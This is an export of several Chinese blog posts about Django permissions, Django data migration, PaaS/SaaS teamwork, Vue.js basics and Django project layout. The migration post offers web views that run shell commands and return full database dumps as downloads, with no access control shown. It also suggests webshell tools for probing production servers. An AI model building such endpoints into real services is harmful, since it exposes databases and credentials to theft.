change和delete三个permission，自定义的permission可以在定义model时手动添加：\n1 2 3 4 5 6 7 8 class Task(models.Model): ... class Meta: permissions = ( (\u0026#34;view_task\u0026#34;, \u0026#34;Can see available tasks\u0026#34;), (\u0026#34;change_task_status\u0026#34;, \u0026#34;Can change the status of tasks\u0026#34;), (\u0026#34;close_task\u0026#34;, \u0026#34;Can remove a task by setting its status as closed\u0026#34;), ) 每个permission都是django.contrib.auth.Permission类型的实例，该类型包含三个字段name, codename 和 content_type，其中 content_type 反映了 permission 属于哪个 model，codename 如上面的 view_task，代码逻辑中检查权限时要用， name 是 permission 的描述，将permission 打印到屏幕或页面时默认显示的就是 name。\n在 model 中创建自定义权限，从系统开发的角度，可理解为创建系统的内置权限，如果需求中涉及到用户使用系统时创建自定义权限，则要通过下面方法：\n1 2 3 4 5 6 from myapp.models import Post from django.contrib.auth.models import Permission from django.contrib.contenttypes.models import ContentType content_type = ContentType.objects.get_for_model(Post) permission = Permission.objects.create(codename=\u0026#39;can_publish\u0026#39;, name=\u0026#39;Can Publish Posts\u0026#39;, content_type=content_type) User和Group django的内置权限认证被绑定在 django.contrib.auth中，而auth中的Permission模型又依赖于contenttypes。\n1 2 3 4 INSTALLED_APPS = ( \u0026#39;django.contrib.auth\u0026#39;， \u0026#39;django.contrib.contenttypes\u0026#39;， ) 1 manage.py syncdb 就会在数据库中，建立如下几个表：\nauth_group auth_group_permissions auth_permission auth_user auth_user_groups auth_user_user_permissions 从表名上可以看到，auth_user 有两个外部对应关系，groups 和 user_permissions。\n1 manage.py shell 上面的命令，能够让解释器加载Django项目中的settings文件，进入可以对项目中对象直接操作的模式。\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; from django.contrib.auth.models import User \u0026gt;\u0026gt;\u0026gt; A = User.objects.create_user(\u0026#39;name\u0026#39;,\u0026#39;nameg@email.com\u0026#39;,\u0026#39;password\u0026#39;) \u0026gt;\u0026gt;\u0026gt; A.groups = [group_list] \u0026gt;\u0026gt;\u0026gt; A.user_permissions = [permission_list] 每个对象的groups和user_permissions都有三个用于修改权限的方法。\nA.groups.[add|remove|clear()]\nA.user_permissions.[add|remove|clear()]\n1.3 使用 通常使用有两种方法，\n在View函数中通过调用has_perm()函数来检测。\nA/Group.has_perm(\u0026lsquo;applabel.task\u0026rsquo;) 用于检查用户/组的权限。另外，A.get_all_permissions()列出用户的所有权限，A.get_group_permissions（）列出用户所属组的权限。 在View函数前使用装饰器。\n@permission_required(\u0026lsquo;applabel.task\u0026rsquo;) 2. Django-guardian 以通常的多人博客系统为例，每篇博文就是一个对象。上述的Django内置权限控制方式，达不到对象级的控制能力。Django中没有提供对象级别的权限控制，但是在架构上留下了接口。django-guardian就是一个很流行的对象级权限控制组件。Object Permission是一种对象颗粒度上的权限机制，它允许为每个具体对象授权。如果把对象b的读写权限赋予User A ,那么User A只具有对对象b的读写权限，而不能对其他同类对象进行操作。\n2.1 配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 pip install django-guardian INSTALLED_APPS = ( \u0026#39;guardian\u0026#39;, ) AUTHENTICATION_BACKENDS = [ \u0026#39;django.contrib.auth.backends.ModelBackend\u0026#39;, # this is default \u0026#39;guardian.backends.ObjectPermissionBackend\u0026#39;, ] #如果要支持匿名用户AnoymousUser的Object级别的权限控制，要在settings中加入 #匿名用户权限控制 ANONYMOUS_USER_ID = -1 1 python manage syncdb 就会在数据库中，建立如下几个表：\nguardian_groupobjectpermission guardian_userobjectpermission 2.2 使用 权限的编辑 guardian.shortcuts.assign(perm, user_or_group, obj=None) 添加权限\nguardian.shortcuts.remove_perm(perm,user_or_group=None, obj=None) 删除权限\nguardian.shortcuts.get_perms(user_or_group,obj) 获取全部权限\nperm,这个参数是一个字符串，代表一个许可，格式必须为 app.perm_codename 或者perm_codename 。但是如果第三个参数是None，则必须为 app.perm_codename 格式。因此建议还是统一使用 app.perm_codename 格式。注意app并不是app的全路径，而是最后一级的模块名。这一点和 INSTALL_APP 中的 app 全路径不同，如果你的 app module 不只一级的话，这地方一定要注意。 user_or_group，这个参数是一个User或者Group类型的对象。 obj，这个参数就是相关的对象了。改参数是可省略的，如果省略则赋予Model权限。 权限的检测 user.has_perm('app.view_task') #检测权限 ObjectPermissionChecker(request.user).has_perm('app.view_task', task) guardian.decorators.permission_required() 3. 参考资料 http://python.usyiyi.cn/django/topics/auth/default.html http://www.jianshu.com/p/01126437e8a4 https://django-guardian.readthedocs.io/en/stable/overview.html ","description":"","id":592,"section":"post","tags":["博文","Django","开发","权限","Python"],"title":"Django的权限控制","uri":"https://www.chenshaowen.com/blog/django-permissions-control.html"},{"content":"1. 背景 在Web开发的过程当中，常会涉及多个环境（本地、测试、正式环境）之间数据的迁移。本文主要探讨在django开发过程中，可能涉及的数据迁移路径，并寻找可行的方法。\n2. 场景 数据迁移对象，一共分为四个：测试环境数据库、正式环境数据库、本地开发机数据库、其他形式存在的数据源。这里其他形式存在的数据源包括：1. Excel、txt、sql、json等，以一定文本形式存在; 2. 提供访问接口的数据源。\n3. 其他数据源到本地 对于 excel、txt、json 格式的数据：\n第一步：Python 读取文本中的数据； 第二步：有两种方法。一种方法是，直接将读取的数据初始化为 django model 中的对象，保存在数据库。另一种方法是通过接口，客户端发送 POST 请求，django 中需要配置 url、编写专用的 views 函数处理这些 POST 请求，写入数据库。 后一种方法，通用性更强，兼容本地、线上的数据导入，推荐使用。 对于SQL格式的数据，可以建一个临时的数据库，然后使用django提供的工具反向创建model。通过两个model之间的字段映射关系，可以很方便的相互读写数据。\n废话不多说，直接看代码！\n3.1 读取 Excel Python读取excel数据，通过接口发送给django处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # -*- coding: utf-8 -*- import time import requests import xlrd url = \u0026#34;http://127.0.0.1:8000/import_data/\u0026#34; filename = \u0026#34;data.xlsx\u0026#34; datalength = 4 def main(): workbook = xlrd.open_workbook(filename) sheets1 = workbook.sheets()[0] for i in range(datalength): data1 = sheets1.row_values(i)[0] data2 = sheets1.row_values(i)[1] data3 = sheets1.row_values(i)[2] data = { \u0026#34;data1\u0026#34;: data1, \u0026#34;data2\u0026#34;: data2, \u0026#34;data3\u0026#34;: data3 } res = requests.post(url, data=data) print i, res time.sleep(1) if __name__ == \u0026#34;__main__\u0026#34;: main() 3.2 读取TXT Python 读取 txt 数据，注意数据的分隔符。逐行读取数据，复制给变量。\n1 2 3 with open(\u0026#39;data.txt\u0026#39;, \u0026#39;rt\u0026#39;) as f: for line in f: data1,data2 = line.split(\u0026#39; \u0026#39;) 3.3 读取JSON Python读取json数据。\n1 2 with open(\u0026#39;data.json\u0026#39;, \u0026#39;r\u0026#39;) as f: data = json.load(f) 3.4 读取SQL 第一步，在本地新建数据库temp_db，执行data.sql，将数据导入库。 第二步，使用dango提供的inspectdb命令，获得数据的model 第三步，编写处理函数，转换两个model的数据 1 2 3 4 5 6 7 8 9 10 11 12 # 修改settings中默认DB的配置，将数据库名改为temp_db # DATABASES = { # \u0026#39;default\u0026#39;: { # \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;, # \u0026#39;NAME\u0026#39;: \u0026#39;temp_db\u0026#39;, # \u0026#39;USER\u0026#39;: \u0026#39;root\u0026#39;, # \u0026#39;PASSWORD\u0026#39;: \u0026#39;\u0026#39;, # \u0026#39;HOST\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, # \u0026#39;PORT\u0026#39;: \u0026#39;3306\u0026#39;, # }, #} python manage.py inspectdb \u0026gt; data_models.py 4. 从本地到线上 着重讨论的是本地数据库与线上数据库之前的迁移。\n4.1 dumpdata与loaddata 命令 1 2 # 本地，导出django app - app_label的数据，也可以不加app_label导出全部数据 manage.py dumpdata app_label \u0026gt; data.json 通过 SVN 提交 data.json 至线上\n线上，导入数据时不需要指定 app，因为在 json 文件 model 字段中已经指明\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def jsonimport(request): import subprocess from django.http import HttpResponse cmd = \u0026#39;/cache/python/bin/python manage.py loaddata data.json\u0026#39; p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() msg = \u0026#39;【%s】：stdout--%s stderr--%s\u0026#39; % (cmd, out, err) try: return HttpResponse(msg) except IOError: return HttpResponse(u\u0026#39;磁盘中不存在该文件!\u0026#39;) except Exception, e: return HttpResponse(u\u0026#39;系统异常!%s\u0026#39; % e) 4.2 subprocess执行SQL - 导入数据 本地将数据库导出为sql文件，提交到线上后，执行sql语句。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 def dbimport(request): import subprocess from django.conf import settings from django.http import HttpResponse db = settings.DATABASES[\u0026#39;default\u0026#39;] dbfile = \u0026#39;static/%s.sql\u0026#39; % db.get(\u0026#39;NAME\u0026#39;) mysql = \u0026#39;mysql\u0026#39; importdb = \u0026#39;{dumpcmd} --user={user} \u0026#39; \\ \u0026#39;--password={password} \u0026#39; \\ \u0026#39;--host={host} \u0026#39; \\ \u0026#39;--port={port} \u0026#39; \\ \u0026#39;-f --default-character-set=utf8 \u0026#39; \\ \u0026#39;{dbname} \u0026lt; {dbfile}\u0026#39;.format(dumpcmd=mysql, user=db.get(\u0026#39;USER\u0026#39;), password=db.get(\u0026#39;PASSWORD\u0026#39;), host=db.get(\u0026#39;HOST\u0026#39;), port=db.get(\u0026#39;PORT\u0026#39;), dbname=db.get(\u0026#39;NAME\u0026#39;), dbfile=dbfile) p = subprocess.Popen(importdb, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() msg = \u0026#39;【%s】：stdout--%s stderr--%s\u0026#39; % (importdb, out, err) try: return HttpResponse(msg) except IOError: return HttpResponse(u\u0026#39;磁盘中不存在该文件!\u0026#39;) except Exception, e: return HttpResponse(u\u0026#39;系统异常!%s\u0026#39; % e) 5. 从线上到线上 线上的数据迁移，可以走接口、保存为文本再迁移、直接复制库。\n通过接口来迁移数据，客户端发送GET请求数据，数据源端提供API。 通过保存为文本迁移，推荐使用 json 文件。json 库提供的 load 和 dump 函数，可以很方便的读写数据。 直接拷贝库，利用 subprocess 库，执行 mysqldump 和 mysql。 5.1 通过json中转 读取数据，写入json\n1 2 3 4 5 6 7 8 9 def dumptojson(request): import json from django.http import HttpResponse data = [{\u0026#39;id\u0026#39;: 1}, {\u0026#39;id\u0026#39;: 2}, {\u0026#39;id\u0026#39;: 3}] fd = json.dumps(data) response = HttpResponse(fd) response[\u0026#39;Content-Type\u0026#39;] = \u0026#39;application/json\u0026#39; response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment;filename=data.json\u0026#39; return response 读取json，写入数据\n1 2 with open(\u0026#39;data.json\u0026#39;, \u0026#39;r\u0026#39;) as f: data = json.load(f) 5.2 通过dumpdata与loaddata 命令 线上的机器，不是想登就能登。上文提到了通过 views 函数执行 loaddata ，将 data.json 导入数据库。下面是执行 dumpdata，将数据从线上导出的 views 函数代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def jsondump(request): import subprocess from datetime import datetime from django.http import HttpResponse file = \u0026#39;data.json\u0026#39; cmd = \u0026#39;/cache/python/bin/python manage.py dumpdata \u0026gt; %s\u0026#39; % file p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() print \u0026#39;【%s】：stdout--%s stderr--%s\u0026#39; % (cmd, out, err) with open(file, \u0026#39;rb\u0026#39;) as fd: file_content = fd.read() response = HttpResponse(file_content) response[\u0026#39;Content-Type\u0026#39;] = \u0026#39;application/octet-stream\u0026#39; response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment;filename=\u0026#34;%s_%s\u0026#34;\u0026#39; % (datetime.now(), file) return response 5.3 subprocess执行SQL - 导出数据 在上文中有通过SQL文件导入数据的代码，下面是从线上导出数据保存为SQL文件的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def dump(request): import os, subprocess from datetime import datetime from django.conf import settings from django.http import HttpResponse db = settings.DATABASES[\u0026#39;default\u0026#39;] dbfile = \u0026#39;static/%s.sql\u0026#39; % db.get(\u0026#39;NAME\u0026#39;) dumpcmd = \u0026#39;mysqldump\u0026#39; dumpdb = \u0026#39;{dumpcmd} --user={user} \u0026#39; \\ \u0026#39;--password={password} \u0026#39; \\ \u0026#39;--host={host} \u0026#39; \\ \u0026#39;--port={port} \u0026#39; \\ \u0026#39;--single-transaction \u0026#39; \\ \u0026#39;{dbname} \u0026gt; {dbfile}\u0026#39;.format(dumpcmd=dumpcmd, user=db.get(\u0026#39;USER\u0026#39;), password=db.get(\u0026#39;PASSWORD\u0026#39;), host=db.get(\u0026#39;HOST\u0026#39;), port=db.get(\u0026#39;PORT\u0026#39;), dbname=db.get(\u0026#39;NAME\u0026#39;), dbfile=dbfile) p = subprocess.Popen(dumpdb, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) out, err = p.communicate() print u\u0026#39;【%s】：stdout--%s stderr--%s\u0026#39; % (dumpdb, out, err) ret = os.popen(\u0026#39;/bin/ls static\u0026#39;) print u\u0026#39;os.popen:%s\u0026#39; % ret.readlines() with open(dbfile, \u0026#39;rb\u0026#39;) as fd: file_content = fd.read() response = HttpResponse(file_content) response[\u0026#39;Content-Type\u0026#39;] = \u0026#39;application/octet-stream\u0026#39; response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment;filename=\u0026#34;%s_%s.sql\u0026#34;\u0026#39; % (db.get(\u0026#39;NAME\u0026#39;), datetime.now()) return response 6. 最佳实践 建议在本地开发测试阶段，以 Python 读取文本、发送 POST 请求的方式迁移数据。 数据再次迁移至测试、正式环境时，只需要修改接口 url 即可。但是要注意，接口的安全性，控制接口的频率。\n测试环境的测试数据迁移正式环境，可以考虑使用 subprocess 库进行处理。如果对线上环境不确定，可以结合 webshell 等工具，先进行探测，减少调试时间。\n","description":"","id":593,"section":"post","tags":["博文","Django","数据","迁移"],"title":"Django-数据迁移的几种方法(附代码)","uri":"https://www.chenshaowen.com/blog/several-methods-of-django-data-migration.html"},{"content":"1. 工作场景 本人所在的小组，20+人的规模，兼具PaaS和SaaS开发的职责。\n开发PaaS的人员PaaSer，主要负责PaaS平台的开发和维护，目标是对SaaS开发提供需要的API和文档。\n开发SaaS的人员SaaSer，主要负责开发基于上述PaaS平台的Web应用，目标是交付给用户SaaS应用。\n关联他们的是，开发者中心、开发框架、Restful风格的API接口、API GateWay。\n开发者中心，提供SaaS应用的创建、部署、管理、日志查询、权限配置、入门指南、开发文档等入口。 开发框架，采用的是Django框架，主要对开发、测试、正式三个运行环境进行适配，针对某些常见的漏洞，增强安全性，还集成了一些常用的装饰器和组件模块。 Restful API，这部分是扩展SaaS功能重要部分。企业总线主要是由此接入，提供给SaaS使用，组件提供的功能也算在其中。 API Gateway， 基于微服务的架构，服务与服务间的通信，需要网关去控制接入策略。这些API，包括敏感权限的API、非原生系统提供的API、某些需要对外服务的SaaS提供的API。最后，API Gateway还可以记录调用Log，统计调用次数。 2. 工作方式 现有的工作方式是，PaaSer负责维护平台的基础功能，同时也负责新功能的开发，比如登录、平台组件等。登录是给每个用户下发票据，有效期内通用于PaaS平台。组件通过API对SaaS提供服务，比如短信、邮件、文件存取等。\nPaaS提供的服务，针对的是SaaS的应用开发人员。清晰的API调用逻辑、简洁易懂的说明文档，是平台云服务商成功的关键。PaaSer会提供大量的文档，指导SaaSer对平台功能的使用。\n实际上PaaS的API功能，常常不能满足SaaS的需求。比如，需要发送验证码。这时，会使用到PaaS提供的发送短信组件的功能，但是，仍需要SaaS做一层封装才能够满足开发需求。比如，需要对业务权限进行管理。这时，会用到PaaS提供的接口，但是依然无法直接满足开发需求。\n久之，SaaS开发人员就会经常拷贝之前自己写过的代码，一部分是对PaaS功能的封装，一部分是业务通用而PaaS平台没提供的功能。这里并不是在指责PaaS平台的开发人员，没有去集成这些功能。我认为，这是缺乏一种功能筛选的机制。这种机制应该能从SaaS功能项中筛选出PaaS平台应该提供的功能。对于整个团队来说，虽然最终交付给用户的是SaaS应用，但是随着开发需求的增长，SaaS开发会被转移出去，沉淀下来的技术和经验应该被固化到PaaS。还有一点就是不能忘记做PaaS的初衷: 降低开发门槛，让SaaS敏捷。\n我思考的是，怎样去构建这种筛选机制？\n3. 如何构建有效的正向机制 正向是哪个向？请看下图。\nIaaS、PaaS、SaaS存在一定依赖关系。先有IaaS，然后PaaS，最后SaaS。现在IaaS和SaaS都有比较成功的案例，亚马逊和Salesforce。\n这是一个动态的圈。当IaaS服务商，能提供成熟的主机服务之后，就会考虑向PaaS突破。而这里的突破点，就是PaaS中最常用用到的功能项。比如，亚马逊提供的存储服务。直接从PaaS入手，不提供IaaS的服务商，成功的非常少，包括GAE、SAE、XAE等都没有取得很大成功，平台依耐性高、迁移成本大，Salesforce是个成功的案例。而Salesforce是从SaaS的CRM入手的。SaaS的圈子扩张很容易理解，随着越来越多的需求接入，SaaS会越来越大。\nPaaS是一个很好的方向。PaaS能黏住用户，具备自动化生产SaaS的潜力。而IaaS提供商门槛低，需要足够的用户群和巨大的基础设施投入。而BaaS之类的服务，可靠性得不到保障，也无法监控，会是PaaS的有力补充。\nPaaSer的职能是，输出各种API和文档，而SaaSer的职能是实现具体的功能，交付用户。工作职能的不同，从一定程度隔离了PaaSer和SaaSer。从技术人员成长的角度思考，SaaSer在不断完成PM的KPI，做业务需求的压力下，意识到最终技术会被沉淀到PaaS，会觉得非常的不安。而PaaSer也在绞尽脑汁的思考怎样提供更好、更多的平台功能，但是思路的来源也限于其他云服务平台、内部调研。\n没有数据，就不能算是现代科学，精细化的运营开发更需要数据支撑。所以，我想到的是要去记录功能项和使用频次。团队使用的Django框架中，一个Project，是由若干个App组成，很好的对功能项进行了划分。\n定义一个SaaS功能项：一个能独立运行、可集成的小项目。第一是要能独立运行起来，第二是可集成，具有独立的标识。所以，需要这几方面的工作：\n需要一个注册SaaS功能项与发号系统。 - 部署Django App注册系统 统计使用频次，不用每次使用都远程刷新一次，采用公平的策略即可。 - 统计策略 统一的Django App风格。- Django App创建模板 建立Django App的评星和留言系统，便于及时反馈，筛选优质Djang App。- 评价系统。 4. 机会 SaaSer的工作成果可以得到非常快的沉淀。共享的SaaS功能项可以集成更大的SaaS功能项，交付给用户的SaaS应用只是其中的一个集成环节。 SaaSer可以分工合作。每个SaaSer实现自己的功能项，然后集成即可。 PaaSer有了平台功能目标。根据统计的SaaS功能项，基于平台优化实现，然后与SaaS功能项竞争，可以激励PaaSer。 5. 风险 有些功能项与场景耦合太紧密，影响功能项的独立性，仍然需要修改后才能使用。比如，发送验证码，又需要记录个人信息表的外键。 一个项目下，可能会有很多的功能项。考验开发者的项目组织能力。 功能项的学习成本VS自己开发。粒度不好把握。 ","description":"","id":594,"section":"post","tags":["博文","云服务","思考","PaaS","SaaS"],"title":"PaaSer与SaaSer的合作方式思考","uri":"https://www.chenshaowen.com/blog/thinking-on-the-cooperative-way-between-paas-and-saas-team.html"},{"content":"1. 遇到了什么问题 如果实现的功能简单，开发和维护容易，是不会有设计模式、框架等相关问题研究的。正是因为，Web系统复杂、需求变更快、复用多，开发人员多、人员交接频繁。我们需要一定的约定规则去规避，这些环节产生的风险。\n其中大量的研究工作在，系统层面：UI层、逻辑层、数据层的分离，开发人员层面：前端、后端分离。\n2. 几种解决模型 2.1 MVC M，封装系统的状态、功能、算法逻辑。对外响应状态查询、通知视图改变。 V，与用户之间交互。对外获取用户输入，发送给Controller，解释模型并发送模型更新请求。 C，封装行为，解释行为。对外将用户的动作映射成模型的更新。 前端中的MVC，View更新DOM，Controller产生各种的事件，Model请求数据。问题在于，Controller的绝大部分功能浏览器自带，View维护大量的DOM元素非常的臃肿。\n2.2 MVP M，封装系统的状态、功能、算法逻辑。对外接受P的变更请求，返回数据。 V，与用户之间交互。对外获取用户输入，发送给P，不需要维护任何数据。 P，封装行为，解释行为。P是M和V的协调者，P负责主动从V捕获请求，从M拉取数据，再推送给V，可以说P是MVP模式的中心。 前端中的MVP，按照这样的分工P承载的内容会非常的多，既要更新V、又要更新M。有些程序员因此又把部分逻辑写入V。\n2.3 MVVM M，封装系统的状态、功能、算法逻辑。 V，与用户之间交互。对外获取用户输入。 VM，绑定M和V。 前端中的MVVM，MVVM是MVP的一种改进。MVP中，P需要手动去同步V和M，而在MVVM中自动完成了这个过程。\n3. Vue是什么 Vue是MVVM的一种实现。\nVue.js 是一个用来开发 web 界面的前端库。它也有配套的周边工具。如果把这些东西都算在一起，那么你也可以叫它一个『前端框架』。但我个人更倾向于把它看做是一套可以灵活选择的工具组合。如果你到现在都还没听说过 Vue.js，你心里可能在想：前端的幺蛾子就是多，怎么又来一个框架？其实 Vue.js 已经开发了两年多了。第一次公开发布则是在 2014 年 2 月。这两年间它一直在不断进化，今天也已经有许多人在生产环境中使用它。 \u0026ndash; 尤雨溪\n按照其描述，Vuejs提供响应式编程、组件化、模块化、动画、路由等特性。\nVue中的几个概念：\n指令：告诉Vue需要更新的属性。默认前缀v-，例如， v-text=\u0026ldquo;message\u0026rdquo;，告诉Vue，当message属性值改变时，更新div的textContent内容。 过滤器：过滤器紧跟在指令的路径或表达式之后，在更新 DOM 之前对值进行进一步处理。 列表渲染：使用v-repeat或v-for指令，循环渲染数据内容。前端处理模板。 事件监听：使用v-on命令来注册监听事件，比如v-on:click:onClick，注册了一个元素点击处理函数。 计算属性：通过定义计算属性，来覆盖复杂逻辑的处理场景。 组件系统：实现标签的自定义。意思就是只需要注册了组件XXX，在html中就能够使用\u0026lt;xxx\u0026gt;\u0026lt;/xxx\u0026gt;,而标签的内容可以使用template自定义。 4. 如何写一个基于Vue的应用 对于一个复杂的项目，通常需要借助一定的管理工具，比如Webpack去管理Vue构建的前端项目。而对于入门实践，这里就不新增Webpack的内容，仅仅熟悉Vue的处理机制和使用方法。\n推荐一个不错的在线js编程环境，JSBIN\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/vue/2.0.3/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div id=\u0026#34;show-input\u0026#34;\u0026gt; \u0026lt;input v-model = \u0026#34;name\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;p\u0026gt;Your input: {{name}}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;double input: {{double}}\u0026lt;/p\u0026gt; \u0026lt;child :cname=\u0026#39;name\u0026#39;\u0026gt;\u0026lt;/child\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var vm = new Vue({ el: \u0026#39;#show-input\u0026#39;, data: { name:\u0026#34;chen\u0026#34; }, components:{ child:Vue.extend({ template:\u0026#39;\u0026lt;div\u0026gt;child:{{cname}}\u0026lt;/div\u0026gt;\u0026#39;, props:{ cname: String } }), }, computed:{ double:function(){ return this.name+this.name } } }); 这里的new Vue，实际上就是在绑定一个DOM元素，其中的el就相当于Jquery中的$()选择器，data属性中定义变量，在html中使用{{ 变量名}}引用，components定义新标签，computed是运算属性，还可以自定义filter。但是这里的属性，仅当前绑定的对象有效，对超出作用域的其他绑定无效。\n","description":"","id":595,"section":"post","tags":["博文","前端","工具","Vuejs"],"title":"Vuejs入门实践","uri":"https://www.chenshaowen.com/blog/101-about-vuejs.html"},{"content":"副标题: 技术与最佳实践\n英文书名:Automation Operations With Python Technique And Best Practices\n作者: 刘天斯\n出版社: 机械工业出版社\n出版年: 2014-11-1\nISBN: 9787111483069\nNotes:\n作者以其运维经历，详细描述了以python为基础的各种工具的使用和配置，是一本适合python运维人员的资料书。\n","description":"","id":596,"section":"post","tags":["书籍","Python"],"title":"Python 自动化运维","uri":"https://www.chenshaowen.com/blog/automation-operations-with-python-technique-and-best-practices.html"},{"content":"1. Django是什么 Django是一套由Python完成的Web开发框架，起初被开发者用于管理以新闻内容为主的网站，2005年7月在BSD许可证发布下开源，2008年6月17日正式成立基金会。与Django一起的Python Web框架还有，Tornado和Flask。\nDjango提供全套的解决方案，包括但不限于，中间件、缓存、Session、ORM、Auth、后台管理、模板、URL映射等。\n2. Django的工作原理 首先介绍一下Django的MTV模式：\nM 代表模型（Model）： 负责业务对象和数据库的关系映射(ORM)。 T 代表模板 (Template)： 负责如何把页面展示给用户(html)。 V 代表视图（View）： 负责业务逻辑，并在适当时候调用Model和Template。 那么，当一个http请求发送给一个Django网站时，Django是如何处理的呢？\n中间件收到一个http请求，对请求进行处理。例如，登录状态，参数的转义，合法性验证等。整个网站处理逻辑中通用的部分可以放在中间件处理。\nDjango在URL分发器中通过正则规则匹配http请求的路径，将请求转发给view函数处理。例如，请求为: http://localhost:8000/index/ ，会匹配到配置的URL路由url(r\u0026rsquo;^index/$\u0026rsquo;, \u0026lsquo;myapp.views.index\u0026rsquo;)，意思也就是说，指定了myapp包的views.py文件中的index函数来处理这一类请求。\nviews中的函数index，处理这个请求，调用Model层提供的方法，获取数据。\nMTV模型中对数据的操作是在Model层，只需要让Model的Manager类继承Django的model.Manager类，可以非常方便的对view函数提供接口。Model的Manager类中的方法收到View层的调用后，使用Django封装的ORM，利用对象操作数据库，然后将结果返回给View层。\nView层的index函数获取到Model层传回的数据对象后，以参数的形式传给Template。\nTemplate中描述的是数据展示的格式，比如一页多少文章，可不可以编辑等。可以使用for、if等常见的语法格式。Template层收到Model的数据对象之后，将数据渲染成html格式，然后返回给中间件处理。\n中间件会对Response进行最后的处理。例如：静态文件的目录URL、Media文件的URL、还有每个页面都会用到的一些变量，都可以通过中间件写入返回的html中。\n返回给浏览器，呈现给用户。\n3. Django的目录结构 3.1 创建Django Project 安装好Django后，使用如下命令创建一个Django项目myproject\n1 django-admin startproject myproject manage.py脚本：用于管理Django站点\n目录myproject\n. __init__.py: 用来告诉python，当前目录是python模块\n. settings.py: 包含项目的所有配置参数\n. urls.py: URL根配置\n. wsgi.py: 内置runserver命令的WSGI应用配置\n3.2 创建Django App 执行命令，在工程目录下创建两个Django App。\n1 2 3 cd myproject django-admin startapp myapp1 django-admin startapp myapp2 然后，在myproject目录下settings.py文件中的INSTALLED_APPS添加上\u0026lsquo;myapp1\u0026rsquo;,\u0026lsquo;myapp2\u0026rsquo;，以便django给这些app建立数据库表；在myproject目录下urls.py文件中import myapp1, myapp2，在urlpatterns字段添加url(r\u0026rsquo;^myapp1/\u0026rsquo;, include(myapp1.urls)), url(r\u0026rsquo;^myapp2/\u0026rsquo;, include(myapp2.urls))，告知django哪些url请求分发到这两个app中。\n到这里，通常我们就可以去填充myapp1、myapp2中的业务逻辑了，最后执行manager.py syncdb、makemigrations、migrate这些命令创建数据库表就可以将整个网站运行起来了。\n3.3 为什么要规范Django的目录结构 如果是一个对可维护性没要求、迭代少的业务，读完上面一部分，就可以了。毕竟，适合的才是最好的，一个简单的业务运用复杂的系统实现是不合理的，理解和学习系统也需要成本。\n但是，如果你不仅仅需要写出一个Django Project，而是以后需要写很多的Django Project、频繁地维护这些Project，那么你就需要好好的考虑一下Django Project的目录结构了。如果你在生产环境发布过Django Project，你一定会发现，上面还缺少一部分的讨论，没错，那就是多环境的配置，至少涉及两个环境：本地开发环境和生产环境。多环境怎样去组织你的项目配置文件呢？\n一个人要开发和维护很多个Django Project，而一个Django Project有很多个Django App，一个App内部封装了大量的业务逻辑，还有上面提到的多环境配置文件。涉及如此之多的文件，我突然想到了管理学，管理学不就是研究如何计划、组织、领导和控制等行为活动，对所拥有的资源进行整合，然后达到目标的过程吗？我们的目标就是，构建一个易维护、可重用的的Django Project。而管理研究产出的是规范，这就是为什么我要规范Django目录结构的原因\n3.4 Django目录结构实践建议 3.4.1 关于粒度 - 一个Django App Django App是一个完整的，可以处理路由请求、返回响应的功能单元。以最小的、可提供服务的单元作为划分，可以减少复用时学习内部逻辑的成本，同时也可以很好的实现单元之间的隔离。\n这样划分粒度对我们构建一个Django App提出要求：能够在App的内部独立完成一次Request请求。\n在生产环境中，我们很少从零开始构建一个Django Project，至少从一个内部已有Django Framework开始填充业务逻辑部分。这样考虑是合理的，但是开发人员在PM的催促下匆忙填充业务逻辑，而没有考虑到Django App的拆分，这样就造成每次都需要从原有Django Project拷贝代码，或者从Django Framework开始一次又一次的重复实现功能。\n3.4.2 怎样去构建一个能够独立完成请求的Django App 重点就是: 每个功能块都使用django-admin创建一个Django App\ndjango已经很明确地告诉我们要怎样构建可以复用的Django App，那就是使用命令行去创建，然后将业务逻辑填充在其中。\n使用命令 django-admin startapp myapp1，创建的 Django App 主要有 admin.py、models.py 文件、tests.py 文件、views.py 文件，但这还不够，还需要 forms.py 对表单进行验证；需要 settings.py 对 APP 中的常量进行配置，这里建议常量以 APP 名开头，比如，MYAPP1_XXX 这样；需要 utils.py 放一些工具函数;需要 template 放模板，这里建议在 template 中再创建一个与APP同名的文件夹放模板，这样可以直接拷贝到 Project 的 Template 目录下；还需要 requirements.txt 写依赖文件。\n由于有两个 myproject 目录，而子 myproject 内只有几个文件，将其拷贝到与APP同一级目录（需要去掉settings.py文件中包头为myproject.部分）。这样下来，Django 的目录结构就成了这样：\n最后是关于多环境的配置：\nDjango通常会配合Nginx和uwsgi一起部署。可以从uwsgi中获取DJANGO_CONF_MODULE变量值来判断所处的运行环境。\nproject目录下的setting.py文件，增加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 WSGI_ENV = 